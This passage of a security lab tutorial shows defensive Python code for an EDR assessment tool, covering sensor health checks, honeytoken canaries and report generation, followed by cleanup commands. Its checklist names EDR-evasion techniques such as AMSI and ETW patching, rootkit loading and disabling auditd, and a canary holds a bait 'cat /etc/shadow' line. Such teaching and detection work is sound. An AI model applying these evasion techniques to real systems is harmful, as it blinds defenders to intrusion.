                module=MODULE_NAME, platform="macos",
                tags=["gatekeeper", "macos"],
            ))
    except Exception:
        pass

    return findings


def _check_linux() -> List[Finding]:
    findings = []
    idx = 1

    # auditd
    try:
        result = subprocess.run(
            ["systemctl", "is-active", "auditd"],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout.strip() != "active":
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="auditd is not active",
                severity=Severity.HIGH, cvss=7.5,
                cwe="CWE-778", mitre="T1562.012",
                description="auditd is not running. Syscall and file access auditing is inactive.",
                evidence=f"systemctl is-active auditd: {result.stdout.strip()}",
                remediation="systemctl enable --now auditd",
                module=MODULE_NAME, platform="linux",
                tags=["auditd", "linux"],
            ))
    except Exception:
        pass
    idx += 1

    # Falco
    try:
        result = subprocess.run(
            ["systemctl", "is-active", "falco"],
            capture_output=True, text=True, timeout=10
        )
        if result.stdout.strip() != "active":
            findings.append(Finding(
                id=f"HEALTH-{idx:03d}",
                title="Falco is not active",
                severity=Severity.HIGH, cvss=7.5,
                cwe="CWE-778", mitre="T1562.001",
                description="Falco runtime security is not running.",
                evidence=result.stdout.strip(),
                remediation="systemctl enable --now falco",
                module=MODULE_NAME, platform="linux",
                tags=["falco", "linux"],
            ))
    except Exception:
        pass

    # audit enabled flag
    try:
        result = subprocess.run(
            ["auditctl", "-s"],
            capture_output=True, text=True, timeout=10
        )
        enabled_line = [l for l in result.stdout.splitlines() if l.startswith("enabled")]
        if enabled_line:
            val = int(enabled_line[0].split()[1])
            if val == 0:
                idx += 1
                findings.append(Finding(
                    id=f"HEALTH-{idx:03d}",
                    title="auditd auditing disabled (enabled=0)",
                    severity=Severity.CRITICAL, cvss=9.1,
                    cwe="CWE-778", mitre="T1562.012",
                    description="auditctl -s shows enabled=0. Auditing is off despite auditd running.",
                    evidence=result.stdout[:300],
                    remediation="sudo auditctl -e 1 && sudo augenrules --load",
                    module=MODULE_NAME, platform="linux",
                    tags=["auditd", "disabled"],
                ))
    except Exception:
        pass

    return findings


def run(verbose: bool = False) -> List[Finding]:
    platform = sys.platform
    if platform == "win32":
        findings = _check_windows()
    elif platform == "darwin":
        findings = _check_macos()
    else:
        findings = _check_linux()

    if verbose:
        print(f"  [health] platform={platform} findings={len(findings)}")

    return findings
```

---

### `edreval/modules/honeypot.py`

```python
"""
honeypot.py — Module 6: Canary/honeypot deployment and access detection.

Deploys canary files (honeytokens) and registry keys that an attacker
would typically access during credential harvesting or privilege escalation.
Records access and reports unauthorized reads.
"""
from __future__ import annotations
import os
import sys
import time
import hashlib
import tempfile
from typing import List, Dict, Optional
from datetime import datetime, timezone

from edreval.finding import Finding, Severity

MODULE_NAME = "honeypot"


class CanaryFile:
    """A file honeytoken with access monitoring via mtime/atime tracking."""

    def __init__(self, path: str, content: str, tag: str):
        self.path = path
        self.content = content
        self.tag = tag
        self._deploy_mtime: Optional[float] = None

    def deploy(self) -> bool:
        """Write the canary file to disk. Returns True on success."""
        try:
            os.makedirs(os.path.dirname(self.path), exist_ok=True)
            with open(self.path, "w") as f:
                f.write(self.content)
            self._deploy_mtime = os.path.getmtime(self.path)
            return True
        except OSError:
            return False

    def check_accessed(self) -> bool:
        """Return True if the file was accessed after deployment."""
        if not os.path.exists(self.path) or self._deploy_mtime is None:
            return False
        current_atime = os.path.getatime(self.path)
        return current_atime > self._deploy_mtime

    def remove(self) -> None:
        try:
            os.remove(self.path)
        except OSError:
            pass


def _get_canaries(platform: str) -> List[CanaryFile]:
    """Return platform-appropriate canary files."""
    canaries = []
    tmp = tempfile.gettempdir()

    # Universal: fake credentials file
    canaries.append(CanaryFile(
        path=os.path.join(tmp, "edreval_canary_creds.txt"),
        content=(
            "# Lab honeypot — DO NOT ACCESS IN PRODUCTION\n"
            "DB_PASSWORD=honeytoken_9f3a2b1c\n"
            "API_KEY=AKIAIOSFODNN7HONEY_TOKEN\n"
            "ADMIN_PASS=H0n3yT0k3n!2026\n"
        ),
        tag="fake-credentials"
    ))

    if platform == "win32":
        canaries.append(CanaryFile(
            path=os.path.join(os.environ.get("USERPROFILE", tmp),
                              ".ssh", "id_rsa_honeytoken"),
            content=(
                "-----BEGIN OPENSSH PRIVATE KEY-----\n"
                "HONEYTOKENKEY_DO_NOT_USE_IN_PRODUCTION\n"
                "-----END OPENSSH PRIVATE KEY-----\n"
            ),
            tag="fake-ssh-key"
        ))
    elif platform == "linux" or platform == "darwin":
        canaries.append(CanaryFile(
            path="/tmp/edreval_honeytoken.key",
            content="-----BEGIN RSA PRIVATE KEY-----\nHONEYTOKEN\n-----END RSA PRIVATE KEY-----\n",
            tag="fake-rsa-key"
        ))
        canaries.append(CanaryFile(
            path="/tmp/.edreval_bash_history_honey",
            content=(
                "ssh admin@192.168.57.1 -i ~/.ssh/id_rsa\n"
                "sudo su -\n"
                "cat /etc/shadow\n"
            ),
            tag="fake-bash-history"
        ))

    return canaries


def run(verbose: bool = False, dwell_seconds: int = 5) -> List[Finding]:
    """
    Deploy canary files, wait dwell_seconds, check for access, return findings.

    In a real engagement, dwell_seconds would be much longer (hours/days).
    For lab purposes, 5 seconds is sufficient to demonstrate the mechanism.
    """
    findings: List[Finding] = []
    platform = sys.platform

    canaries = _get_canaries(platform)
    deployed = []

    for canary in canaries:
        if canary.deploy():
            deployed.append(canary)
            if verbose:
                print(f"  [honeypot] deployed: {canary.path} [{canary.tag}]")

    if not deployed:
        findings.append(Finding(
            id="HONEY-001",
            title="No canary files could be deployed",
            severity=Severity.LOW, cvss=2.0,
            cwe=None, mitre="DS0022",
            description="Failed to write all canary files to disk.",
            evidence="Check permissions on target directories.",
            remediation="Run with appropriate permissions.",
            module=MODULE_NAME, platform=platform,
        ))
        return findings

    # Wait for potential access
    if verbose:
        print(f"  [honeypot] waiting {dwell_seconds}s for canary access...")
    time.sleep(dwell_seconds)

    accessed: List[CanaryFile] = []
    for canary in deployed:
        if canary.check_accessed():
            accessed.append(canary)

    if accessed:
        tags = [c.tag for c in accessed]
        findings.append(Finding(
            id="HONEY-002",
            title=f"Honeytoken files accessed ({len(accessed)} files triggered)",
            severity=Severity.CRITICAL, cvss=9.8,
            cwe="CWE-312",
            mitre="T1552.001",
            description=(
                f"{len(accessed)} canary files were accessed after deployment. "
                "This indicates an active attacker or tool performing credential "
                "harvesting or file enumeration."
            ),
            evidence=(
                f"Accessed: {', '.join(c.path for c in accessed)}\n"
                f"Tags: {', '.join(tags)}"
            ),
            remediation=(
                "Isolate the system immediately. "
                "Correlate file access with process audit logs (auditd/Sysmon). "
                "Identify the PID that accessed the canary files."
            ),
            module=MODULE_NAME,
            platform=platform,
            tags=["honeytoken", "credential-access"] + tags,
        ))
    else:
        findings.append(Finding(
            id="HONEY-003",
            title="No honeytoken access detected during dwell window",
            severity=Severity.INFO, cvss=0.0,
            cwe=None, mitre="DS0022",
            description=(
                f"{len(deployed)} canary files were deployed and monitored for "
                f"{dwell_seconds}s. No access was detected."
            ),
            evidence=f"Monitored: {', '.join(c.path for c in deployed)}",
            remediation="Leave canaries deployed long-term for ongoing detection.",
            module=MODULE_NAME,
            platform=platform,
            tags=["honeytoken", "baseline"],
        ))

    # Cleanup canaries
    for canary in deployed:
        canary.remove()

    return findings
```

---

### `edreval/reporters/json_reporter.py`

```python
"""json_reporter.py — Serialize findings to JSON."""
from __future__ import annotations
import json
from datetime import datetime, timezone
from typing import List
from edreval.finding import Finding


def generate(findings: List[Finding], meta: dict = None) -> str:
    """Return a JSON string for the full findings list."""
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "tool": "EDREVAL",
        "version": "1.0.0",
        "meta": meta or {},
        "findings_count": len(findings),
        "severity_summary": _severity_summary(findings),
        "findings": [f.to_dict() for f in findings],
    }
    return json.dumps(report, indent=2)


def _severity_summary(findings: List[Finding]) -> dict:
    summary = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        if f.severity in summary:
            summary[f.severity] += 1
    return summary
```

---

### `edreval/reporters/markdown_reporter.py`

```python
"""markdown_reporter.py — Render findings as a Markdown report."""
from __future__ import annotations
from datetime import datetime, timezone
from typing import List
from edreval.finding import Finding, Severity


SEVERITY_EMOJI = {
    Severity.CRITICAL: "🔴",
    Severity.HIGH:     "🟠",
    Severity.MEDIUM:   "🟡",
    Severity.LOW:      "🔵",
    Severity.INFO:     "⚪",
}


def generate(findings: List[Finding], meta: dict = None) -> str:
    meta = meta or {}
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    lines = []

    lines.append("# EDREVAL Assessment Report")
    lines.append(f"\n**Generated:** {ts}  ")
    lines.append(f"**Target:** {meta.get('target', 'localhost')}  ")
    lines.append(f"**Modules:** {meta.get('modules', 'all')}  ")

    # Severity summary table
    summary = {s: 0 for s in (Severity.CRITICAL, Severity.HIGH,
                                Severity.MEDIUM, Severity.LOW, Severity.INFO)}
    for f in findings:
        if f.severity in summary:
            summary[f.severity] += 1

    lines.append("\n## Summary\n")
    lines.append("| Severity | Count |")
    lines.append("|----------|-------|")
    for sev, count in summary.items():
        lines.append(f"| {SEVERITY_EMOJI.get(sev,'')} {sev} | {count} |")

    lines.append("\n## Findings\n")

    # Group by severity
    order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW, Severity.INFO]
    for sev in order:
        sev_findings = [f for f in findings if f.severity == sev]
        if not sev_findings:
            continue
        lines.append(f"### {SEVERITY_EMOJI.get(sev,'')} {sev} ({len(sev_findings)})\n")
        for f in sev_findings:
            lines.append(f"#### [{f.id}] {f.title}\n")
            lines.append(f"| Field | Value |")
            lines.append(f"|-------|-------|")
            lines.append(f"| **Module** | `{f.module}` |")
            lines.append(f"| **MITRE** | `{f.mitre}` |")
            lines.append(f"| **CVSS** | {f.cvss} |")
            if f.cwe:
                lines.append(f"| **CWE** | `{f.cwe}` |")
            lines.append(f"| **Platform** | `{f.platform}` |")
            if f.tags:
                lines.append(f"| **Tags** | `{'`, `'.join(f.tags)}` |")
            lines.append("")
            lines.append(f"**Description:** {f.description}\n")
            lines.append(f"**Evidence:**\n```\n{f.evidence}\n```\n")
            lines.append(f"**Remediation:** {f.remediation}\n")
            lines.append("---\n")

    return "\n".join(lines)
```

---

### `edreval_cli.py`

```python
#!/usr/bin/env python3
"""
edreval_cli.py — EDREVAL command-line interface.

Usage:
    python edreval_cli.py [--modules hooks,etw,callstack,persistence,health,honeypot]
                          [--output json|markdown|both]
                          [--outfile PATH]
                          [--target HOSTNAME]
                          [--verbose]

Example:
    python edreval_cli.py --modules hooks,etw,health --output both --outfile /tmp/report
    python edreval_cli.py --modules all --output json --verbose
"""
from __future__ import annotations
import argparse
import sys
import os
import importlib
import traceback
from typing import List, Dict, Any

# Ensure edreval package is on path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from edreval.finding import Finding, Severity
from edreval.reporters.json_reporter import generate as json_generate
from edreval.reporters.markdown_reporter import generate as md_generate

AVAILABLE_MODULES = ["hooks", "etw", "callstack", "persistence", "health", "honeypot"]

SEVERITY_ORDER = {
    Severity.CRITICAL: 0,
    Severity.HIGH:     1,
    Severity.MEDIUM:   2,
    Severity.LOW:      3,
    Severity.INFO:     4,
}

COLOR_RESET = "\033[0m"
COLORS = {
    Severity.CRITICAL: "\033[91m",
    Severity.HIGH:     "\033[31m",
    Severity.MEDIUM:   "\033[33m",
    Severity.LOW:      "\033[34m",
    Severity.INFO:     "\033[37m",
}


def print_banner():
    print("""
╔═══════════════════════════════════════════════╗
║           EDREVAL  v1.0.0                     ║
║   EDR Visibility and Evasion Assessment Tool  ║
╚═══════════════════════════════════════════════╝
""")


def run_module(module_name: str, verbose: bool) -> List[Finding]:
    """Import and execute a named module, returning its findings."""
    try:
        mod = importlib.import_module(f"edreval.modules.{module_name}")
        if verbose:
            print(f"[*] Running module: {module_name}")
        findings = mod.run(verbose=verbose)
        if verbose:
            print(f"    → {len(findings)} findings")
        return findings
    except ModuleNotFoundError:
        print(f"[!] Module not found: {module_name}", file=sys.stderr)
        return []
    except Exception as e:
        print(f"[!] Module {module_name} failed: {e}", file=sys.stderr)
        if verbose:
            traceback.print_exc()
        return []


def print_finding(f: Finding) -> None:
    color = COLORS.get(f.severity, COLOR_RESET)
    print(f"\n{color}[{f.severity}]{COLOR_RESET} [{f.id}] {f.title}")
    print(f"  MITRE: {f.mitre}  CVSS: {f.cvss}  Platform: {f.platform}")
    if f.description:
        # Print first sentence only for brevity in CLI output
        desc = f.description.split('.')[0] + '.'
        print(f"  {desc}")


def print_summary(findings: List[Finding]) -> None:
    print("\n" + "="*55)
    print("EDREVAL FINDINGS SUMMARY")
    print("="*55)
    counts: Dict[str, int] = {s: 0 for s in SEVERITY_ORDER}
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
    for sev in sorted(SEVERITY_ORDER, key=lambda s: SEVERITY_ORDER[s]):
        c = counts.get(sev, 0)
        if c > 0:
            color = COLORS.get(sev, COLOR_RESET)
            print(f"  {color}{sev:<10}{COLOR_RESET}: {c}")
    print(f"\n  Total findings: {len(findings)}")
    critical_count = counts.get(Severity.CRITICAL, 0)
    if critical_count > 0:
        print(f"\n  {COLORS[Severity.CRITICAL]}[!] {critical_count} CRITICAL findings require immediate attention{COLOR_RESET}")


def main():
    parser = argparse.ArgumentParser(
        prog="edreval",
        description="EDREVAL — EDR Visibility and Evasion Assessment Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--modules",
        default="all",
        help=f"Comma-separated module list or 'all'. Available: {','.join(AVAILABLE_MODULES)}",
    )
    parser.add_argument(
        "--output",
        choices=["json", "markdown", "both"],
        default="both",
        help="Report output format",
    )
    parser.add_argument(
        "--outfile",
        default=None,
        help="Base path for report files (extensions added automatically)",
    )
    parser.add_argument(
        "--target",
        default=os.environ.get("COMPUTERNAME") or os.uname().nodename if hasattr(os, "uname") else "localhost",
        help="Target hostname for report metadata",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Verbose output",
    )
    parser.add_argument(
        "--no-banner",
        action="store_true",
        help="Suppress banner",
    )
    args = parser.parse_args()

    if not args.no_banner:
        print_banner()

    # Resolve module list
    if args.modules.lower() == "all":
        modules_to_run = AVAILABLE_MODULES
    else:
        modules_to_run = [m.strip() for m in args.modules.split(",")]
        invalid = [m for m in modules_to_run if m not in AVAILABLE_MODULES]
        if invalid:
            print(f"[!] Unknown modules: {', '.join(invalid)}", file=sys.stderr)
            print(f"    Available: {', '.join(AVAILABLE_MODULES)}", file=sys.stderr)
            sys.exit(1)

    print(f"[*] Target: {args.target}")
    print(f"[*] Modules: {', '.join(modules_to_run)}")
    print(f"[*] Output:  {args.output}")
    print("")

    # Run all selected modules
    all_findings: List[Finding] = []
    for module_name in modules_to_run:
        findings = run_module(module_name, verbose=args.verbose)
        all_findings.extend(findings)
        for f in findings:
            print_finding(f)

    # Sort by severity
    all_findings.sort(key=lambda f: SEVERITY_ORDER.get(f.severity, 99))

    print_summary(all_findings)

    # Generate reports
    meta = {
        "target": args.target,
        "modules": args.modules,
        "tool": "EDREVAL",
        "version": "1.0.0",
    }

    if args.output in ("json", "both"):
        json_str = json_generate(all_findings, meta)
        if args.outfile:
            path = args.outfile + ".json"
            with open(path, "w") as f:
                f.write(json_str)
            print(f"\n[+] JSON report: {path}")
        else:
            if args.verbose:
                print("\n--- JSON REPORT ---")
                print(json_str[:2000] + ("..." if len(json_str) > 2000 else ""))

    if args.output in ("markdown", "both"):
        md_str = md_generate(all_findings, meta)
        if args.outfile:
            path = args.outfile + ".md"
            with open(path, "w") as f:
                f.write(md_str)
            print(f"[+] Markdown report: {path}")
        else:
            if args.verbose:
                print("\n--- MARKDOWN REPORT ---")
                print(md_str[:2000] + ("..." if len(md_str) > 2000 else ""))

    # Exit code: 1 if any CRITICAL finding
    critical = sum(1 for f in all_findings if f.severity == Severity.CRITICAL)
    sys.exit(1 if critical > 0 else 0)


if __name__ == "__main__":
    main()
```

---

### Running EDREVAL

```bash
# analysis-station — run all modules
cd /opt/edreval
source .venv/bin/activate

# Full assessment, save reports
python edreval_cli.py \
    --modules all \
    --output both \
    --outfile /opt/edreval/reports/assessment_$(date +%Y%m%d_%H%M%S) \
    --target windows-target \
    --verbose

# Targeted: hook and ETW modules only
python edreval_cli.py --modules hooks,etw --output json --verbose

# Linux persistence + health check
python edreval_cli.py --modules persistence,health --output markdown \
    --outfile /tmp/linux_edreval
```

**Expected CLI output**
```
╔═══════════════════════════════════════════════╗
║           EDREVAL  v1.0.0                     ║
║   EDR Visibility and Evasion Assessment Tool  ║
╚═══════════════════════════════════════════════╝

[*] Target: windows-target
[*] Modules: hooks,etw,callstack,persistence,health,honeypot
[*] Output:  both

[*] Running module: hooks
    → 2 findings

[CRITICAL] [HOOK-002] No EDR user-mode hooks detected in ntdll.dll
  MITRE: T1562.001  CVSS: 9.8  Platform: windows
  None of the monitored ntdll.dll functions have EDR inline hooks.

[*] Running module: etw
    → 1 findings

[HIGH] [ETW-001] Critical ETW providers not active (2 missing)
  MITRE: T1562.006  CVSS: 7.5  Platform: windows
  2 of 6 critical ETW providers are not in the active session list.

...

=======================================================
EDREVAL FINDINGS SUMMARY
=======================================================
  CRITICAL  : 3
  HIGH      : 4
  MEDIUM    : 2
  LOW       : 1
  INFO      : 2

  Total findings: 12

  [!] 3 CRITICAL findings require immediate attention

[+] JSON report: /opt/edreval/reports/assessment_20260518_100000.json
[+] Markdown report: /opt/edreval/reports/assessment_20260518_100000.md
```

---

## Lab Validation Checklist

Use this checklist to confirm each exercise was completed correctly and that both offensive execution and defensive detection were verified.

### Part A — Offensive Exercises

| # | Exercise | Technique | MITRE ID | Executed | Detection Verified | Cleaned Up |
|---|----------|-----------|----------|----------|--------------------|------------|
| 1 | NTDLL Unhooking via KnownDlls | `.text` section restore from `\KnownDlls\ntdll.dll` | T1562.001 | ☐ | ☐ | ☐ |
| 2 | Direct Syscalls — Hell's Gate / Halo's Gate | SSN resolution via EAT scan + stub bytes | T1106 | ☐ | ☐ | ☐ |
| 3 | ETW Patching | `EtwEventWrite` prologue `xor eax,eax; ret` patch | T1562.006 | ☐ | ☐ | ☐ |
| 4 | AMSI Bypass | `AmsiScanBuffer` patch + CLR reflection `amsiInitFailed` | T1562.001 | ☐ | ☐ | ☐ |
| 5 | Call-Stack Spoofing + Ekko Sleep Masking | RC4 encryption via `RtlCreateTimer` chain | T1620 | ☐ | ☐ | ☐ |
| 6 | PPID Spoofing + Command-Line Argument Spoofing | `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` + PEB overwrite | T1134.004 / T1564.010 | ☐ | ☐ | ☐ |
| 7 | Early Bird APC Injection | `NtQueueApcThread` before `NtResumeThread` | T1055.004 | ☐ | ☐ | ☐ |
| 8 | Hardware Breakpoint VEH Syscall Invocation | DR0 + VEH + `syscall;ret` gadget redirect | T1106 / T1562.001 | ☐ | ☐ | ☐ |
| 9 | macOS Persistence + TCC Bypass | LaunchDaemon + dylib proxy + TCC.db INSERT | T1543.004 / T1574.006 | ☐ | ☐ | ☐ |
| 10 | Linux Fileless Execution + `/proc/PID/mem` Injection | `memfd_create` + `fexecve` + ptrace | T1620 / T1055.008 | ☐ | ☐ | ☐ |
| 11 | Linux Kernel Rootkit (Diamorphine) + auditd Evasion | LKM hook + `auditctl -e 0` | T1014 / T1562.012 | ☐ | ☐ | ☐ |

### Part B — Defensive Exercises

| # | Exercise | Validated |
|---|----------|-----------|
| 12 | Windows EDR sensor verification (4 layers: kernel callbacks, ETW, hooks, cloud) | ☐ |
| 13 | macOS EDR health: SIP, Gatekeeper, TCC monitoring, ESF consumer registration | ☐ |
| 14 | Linux EDR health: Falco active, auditd enabled, BPF LSM, hidden module detection | ☐ |
| 15 | YARA + Sigma rules deployed and scanning processes / SIEM ingestion verified | ☐ |
| 16 | Atomic Red Team tests executed; EDR gap analysis report generated | ☐ |

### Part C — EDREVAL Framework

| Component | Implemented | Tested |
|-----------|-------------|--------|
| `finding.py` — Finding dataclass with `to_dict()`, severity constants | ☐ | ☐ |
| `hooks.py` — NTDLL hook integrity, clean/hooked stub detection | ☐ | ☐ |
| `etw.py` — EtwEventWrite patch detection, provider coverage, PS logging | ☐ | ☐ |
| `callstack.py` — Stack frame outside module detection, short stack alert | ☐ | ☐ |
| `persistence.py` — Windows autorun, macOS LaunchDaemons, Linux systemd/SSH | ☐ | ☐ |
| `health.py` — Service/process checks, SIP/Gatekeeper, auditd/Falco state | ☐ | ☐ |
| `honeypot.py` — Canary file deployment and access detection | ☐ | ☐ |
| `json_reporter.py` — JSON serialization with severity summary | ☐ | ☐ |
| `markdown_reporter.py` — Markdown report with grouped findings table | ☐ | ☐ |
| `edreval_cli.py` — argparse CLI, module dispatch, exit code on CRITICAL | ☐ | ☐ |

### Detection Coverage Matrix

Verify that each offensive technique maps to at least one detection signal:

| Technique | Primary Detection Signal | Backup Signal | Detected in Lab? |
|-----------|--------------------------|---------------|-----------------|
| NTDLL unhooking | ETW: `NtProtectVirtualMemory` on ntdll `.text` | Sysmon ProcessTampering (EID 25) | ☐ |
| Direct syscalls | ETW TI provider `KiSystemCall64` events (PPL) | YARA stub pattern scan | ☐ |
| ETW patching | Kernel-mode ETW consumer (PPL) continues firing | Sysmon EID 10 on `NtProtect` targeting ntdll | ☐ |
| AMSI bypass | Sysmon `NtProtect` on `amsi.dll` | PowerShell ML/heuristic engine | ☐ |
| Sleep masking | Memory scanner: encrypted RX region (high entropy, no PE header) | ETW timer-chain API events | ☐ |
| PPID spoofing | Sysmon EID 1 parent mismatch | ETW: `OpenProcess(PROCESS_ALL_ACCESS)` on explorer | ☐ |
| Early Bird APC | ETW: `NtQueueApcThread` on `CREATE_SUSPENDED` process | Sysmon EID 8 CreateRemoteThread | ☐ |
| Hardware breakpoint VEH | ETW: `NtSetContextThread` setting DR0-DR3 in non-debug context | `EXCEPTION_SINGLE_STEP` in non-debugger | ☐ |
| macOS LaunchDaemon | ESF `ES_EVENT_TYPE_NOTIFY_WRITE` on `/Library/LaunchDaemons` | osquery `launchd` table | ☐ |
| TCC.db manipulation | ESF write event on `TCC.db` | MDM policy violation alert | ☐ |
| Linux `memfd_create` | auditd syscall 319 (`SYS_memfd_create`) | Falco `Execution from memfd` rule | ☐ |
| Diamorphine rootkit | Hidden module comparison (`/proc/modules` vs `/sys/module`) | Volatility3 `linux.hidden_modules` | ☐ |
| auditd evasion (`-e 0`) | Secondary log source (Falco, syslog) not dependent on auditd | Kernel lockdown prevents `-e 0` if `lockdown=confidentiality` | ☐ |

### Final Verification Commands

**Windows (run on windows-target as Administrator)**
```powershell
# Verify no lab artifacts remain
Get-ChildItem C:\lab -ErrorAction SilentlyContinue | Format-Table Name
Get-Process | Where-Object { $_.Name -in @("unhook","directsys","etw_patch","early_bird","hwbp_syscall","sleep_mask","ppid_spoof","AmsiPatch") }
# Should return nothing

# Verify Sysmon still running
Get-Service Sysmon64 | Select-Object Status
# Expected: Running

# Verify AMSI not bypassed in current session
[System.Net.ServicePointManager]::SecurityProtocol
# Should return without error (AMSI still active in this new session)
```

**Linux (run on linux-lab as root)**
```bash
# Verify no rootkit modules remain
lsmod | grep diamorphine  # should be empty
# Verify auditd is active and rules intact
auditctl -s | grep enabled  # should show: enabled 1
auditctl -l | grep -c "exec_monitor\|ptrace_monitor\|kmod_monitor\|fileless_exec"
# Should return 4

# Verify Falco running
systemctl is-active falco  # should return: active

# No temp lab files
ls /tmp/memfd_exec /tmp/proc_inject /tmp/diamorphine_secret_test 2>/dev/null
# Should all fail (files removed)
```

**macOS (run on macos-lab)**
```bash
# Verify no rogue LaunchDaemons
sudo launchctl list | grep lab.persist  # should be empty
sudo ls /Library/LaunchDaemons/ | grep lab  # should be empty

# Verify TCC entries cleaned
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
    "SELECT count(*) FROM access WHERE client LIKE '%lab%';"
# Should return: 0

# Verify SIP
csrutil status  # should show: enabled
```

**analysis-station — EDREVAL sanity check**
```bash
cd /opt/edreval
source .venv/bin/activate
python -c "
from edreval.finding import Finding, Severity
from edreval.reporters.json_reporter import generate
from edreval.reporters.markdown_reporter import generate as md_gen
import json

# Smoke test
f = Finding(
    id='TEST-001', title='Smoke test finding',
    severity=Severity.INFO, cvss=0.0, cwe=None,
    mitre='T1562.001', description='Framework operational.',
    evidence='OK', remediation='N/A', module='test', platform='all'
)
report_json = generate([f])
data = json.loads(report_json)
assert data['findings_count'] == 1, 'JSON reporter failed'
report_md = md_gen([f])
assert '# EDREVAL' in report_md, 'Markdown reporter failed'
print('[+] EDREVAL framework smoke test PASSED')
"
```

---

*Tutorial #25 of 70 — maps 1:1 to `domain11_chapter11B_edr_evasion_platform.md`*  
*Network: 192.168.57.0/24 (isolated lab) | Platform coverage: Windows 10/11, macOS 14 Sonoma, Ubuntu 22.04 LTS*
